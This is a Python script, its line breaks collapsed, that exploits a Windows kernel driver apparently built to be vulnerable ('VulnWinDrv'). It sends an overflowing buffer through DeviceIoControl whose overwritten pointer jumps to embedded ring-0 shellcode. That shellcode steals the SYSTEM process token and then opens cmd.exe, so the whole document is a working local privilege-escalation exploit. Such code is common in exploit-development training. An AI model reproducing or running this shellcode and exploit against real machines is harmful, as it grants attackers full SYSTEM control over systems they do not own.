#!/usr/bin/pythonfrom ctypes import *import structimport timeimport oskernel32 = windll.kernel32if __name__ == '__main__':	GENERIC_READ  = 0x80000000	GENERIC_WRITE = 0x40000000	OPEN_EXISTING = 0x3	IOCTL		  = 0x22E007	DEVICE_NAME   = "\\\\.\\VulnWinDrv"	dwReturn      = c_ulong()	ring0_shellc  = "\x90" * 10	ring0_shellc  += "\x60\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00"	ring0_shellc  += "\x00\x04\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\xc3"	eip			  = id(ring0_shellc) + 20		input_size    = 44	input_buffer  = struct.pack("L", 0x0BADF00D) + struct.pack("L", 0x000000)	input_buffer  += "\x41" * (input_size - len(input_buffer) - 4)	input_buffer  += struct.pack("L", eip)	out_size      = 40	output_buffer = "\x00" * out_size	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,                                                 0, None, OPEN_EXISTING, 0, None)	if driver_handle:		print "(+) Trigger the vulnerable IOCTL..."		dev_ioctl = kernel32.DeviceIoControl(driver_handle, IOCTL,								input_buffer, input_size,								output_buffer, out_size,								byref(dwReturn), None)	print "(+) Just a moment..."	time.sleep(1)	os.system("cmd.exe")